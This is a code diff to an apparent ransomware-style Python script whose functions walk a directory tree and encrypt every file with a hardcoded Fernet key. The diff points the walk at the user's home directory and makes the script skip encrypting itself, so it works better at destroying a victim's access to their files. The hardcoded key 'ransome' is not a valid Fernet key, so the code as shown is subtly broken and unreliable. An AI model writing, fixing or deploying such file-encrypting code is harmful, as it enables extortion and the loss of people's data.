@@ -5,11 +5,14 @@ from cryptography.fernet import Fernet
 def encrypt_files(verbose=False):
     key = b'ransome'  # Hardcoded encryption key
     fernet = Fernet(key)
+    home_directory = os.path.expanduser("~")
     if verbose:
         print("Encrypting files...")
-    for root, dirs, files in os.walk("~/"):  # Start from the root directory
+    for root, dirs, files in os.walk(home_directory):
         for file in files:
             file_path = os.path.join(root, file)
+            if file_path == os.path.abspath(__file__):  # Skip encrypting the script file itself
+                continue
             if verbose:
                 print("Encrypting:", file_path)
             with open(file_path, "rb") as f:
@@ -23,9 +26,10 @@ def encrypt_files(verbose=False):
 def decrypt_files(verbose=False):
     key = b'ransome'  # Hardcoded encryption key
     fernet = Fernet(key)
+    home_directory = os.path.expanduser("~")
     if verbose:
         print("Decrypting files...")
-    for root, dirs, files in os.walk("/"):  # Start from the root directory
+    for root, dirs, files in os.walk(home_directory):
         for file in files:
             file_path = os.path.join(root, file)
             if verbose:
